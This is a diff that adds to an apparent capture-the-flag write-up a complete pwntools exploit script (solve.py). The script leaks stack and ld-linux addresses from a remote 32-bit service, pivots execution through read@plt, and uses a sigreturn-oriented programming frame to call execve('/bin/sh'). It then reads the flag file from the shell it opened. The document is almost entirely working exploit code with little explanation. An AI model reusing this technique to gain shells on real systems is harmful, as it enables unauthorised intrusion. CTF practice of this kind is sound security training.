@@ -98,3 +98,73 @@ Run:
 python3 /home/parth/HACK/solve.py
 ```
 
+## solve.py : 
+```
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = 'i386'
+
+HOST = 'tcp-shellcode-23927bbcf875c685.chall.bts.wh.edu.pl'
+PORT = 443
+
+
+def solve():
+    io = remote(HOST, PORT, ssl=True, sni=HOST)
+
+    leak = io.recvn(64)
+    saved_ecx = u32(leak[12:16])
+    buf = saved_ecx - 0x1C
+
+    # Leaked pointer into ld-linux text segment is at offset +0x1b460 from base.
+    ld_base = u32(leak[4:8]) - 0x1B460
+    int80_ret = ld_base + 0x1B400  # int 0x80 ; ret
+
+    # Stage 1: pivot to read@plt and force read(..., count=0x77)
+    # so eax=0x77 -> sigreturn syscall number on i386.
+    stage1 = flat(
+        0x8049020,   # read@plt
+        0x11111111,  # overwritten by stage2
+        0,           # fd
+        buf + 4,     # destination for stage2
+        0x77,        # exact bytes => eax=0x77
+        0x22222222,
+        0x33333333,
+        word_size=32,
+    )
+
+    # Stage 2: SROP frame for execve('/bin/sh', 0, 0)
+    frame = SigreturnFrame(kernel='i386')
+    frame.gs = 0
+    frame.fs = 0
+    frame.es = 0x2B
+    frame.ds = 0x2B
+    frame.eax = 11  # execve
+    binsh = buf + 4 + 4 + len(bytes(frame))
+    frame.ebx = binsh
+    frame.ecx = 0
+    frame.edx = 0
+    frame.eip = int80_ret
+    frame.cs = 0x23
+    frame.eflags = 0x202
+    frame.esp = buf + 0x200
+    frame.ss = 0x2B
+    frame.esp_at_signal = buf + 0x200
+
+    stage2 = p32(int80_ret) + bytes(frame) + b'/bin/sh\x00'
+    stage2 = stage2.ljust(0x77, b'P')
+
+    io.send(stage1)
+    io.send(stage2)
+
+    io.sendline(b'cat /app/flag.txt')
+    out = io.recvrepeat(2)
+    print(out.decode(errors='ignore').strip())
+
+    io.close()
+
+
+if __name__ == '__main__':
+    solve()
+
+```
